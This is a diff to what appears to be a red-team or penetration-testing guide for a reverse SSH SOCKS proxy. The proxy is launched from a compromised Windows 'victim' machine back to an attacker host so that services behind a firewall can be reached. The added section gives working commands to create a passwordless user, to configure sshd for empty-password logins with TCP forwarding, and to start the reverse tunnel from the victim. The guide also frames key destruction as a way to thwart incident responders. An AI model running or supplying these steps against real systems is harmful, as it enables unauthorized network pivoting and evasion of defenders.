@@ -9,6 +9,8 @@ The following diagram shows the scenario.  An external attacker system (A) is ru
 
 **Preparing the attack host**<br />
 
+*To configure a low-privilege user without a password as an alternative to relying on SSH keys see the section* **Alternate attack host preparation**
+
 * On host (A) create a disposable SSH key pair.  The key will be destroyed after use in order to prevent reuse by incident responders.<br /><br />
   `cd /root`<br /><br />
   `ssh-keygen -t rsa -b 2048 -N "" -f /root/temp_rsa -q`<br /><br />
@@ -33,3 +35,23 @@ Any other protected service behind the firewall could be accessed through Socks 
 When you are finished and want to terminate the reverse proxy, issue the following command on the attacker host (A).
 
 `kill $(lsof -t -i:1080)`
+
+**Alternate attack host preparation**<br />
+
+* On Attack host (A) create a low-priv user, remove the password, and allow the user account to log on without a password.<br /><br />
+  `adduser tempuser` (supply a password when prompted, will be removed in the next step)<br /><br />
+  `passwd -d -u tempuser`<br /><br />
+  Edit `sshd_config` and add the following section:<br /><br />
+  ```
+  Match User tempuser
+   PasswordAuthentication yes
+   PermitEmptyPasswords yes
+   AllowTcpForwarding yes
+  ```
+
+  Restart SSH `systemctl restart ssh`<br /><br />
+* On the Windows victim computer (B) start the proxy server with this command.  No key is needed:<br /><br />
+  `%SYSTEMROOT%\System32\OpenSSH\ssh.exe -o StrictHostKeychecking=no -R localhost:1080 tempuser@192.168.1.242 "bash"`<br /><br />
+* To disable the tempuser account on host (A) to prevent further logins, execute the following command:<br /><br />
+  `usermod -L tempuser`<br /><br />
+  When finished delete the tempuser account `deluser --remove-home tempuser` and clean up `sshd_config`.
